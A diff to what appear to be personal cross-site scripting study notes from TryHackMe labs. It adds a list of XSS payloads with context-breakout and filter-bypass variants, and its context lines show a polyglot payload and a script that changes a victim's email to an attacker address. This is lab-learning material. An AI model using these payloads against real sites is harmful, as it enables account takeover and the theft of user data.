@@ -85,6 +85,16 @@ Business Logic:
 
     <script>user.changeEmail('attacker@hacker.thm');</script>
 
+Some payloads :
+
+    <script>alert('THM');</script>
+    "><script>alert('THM');</script> (when the input is inside a tag <>)
+    </textarea><script>alert('THM');</script> (when input is between <textarea> tags)
+    ';alert('THM');// (when js get the input with  document.getElementsByClassName('name')[0].innerHTML='Adam')
+    <sscriptcript>alert('THM');</sscriptcript> (when "script" is filtered)
+    onload="alert('THM'); (when inside an image tag and "<" ">" are filtered
+    
+
 Polyglot (c'est OP)
 
     jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/-       -!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
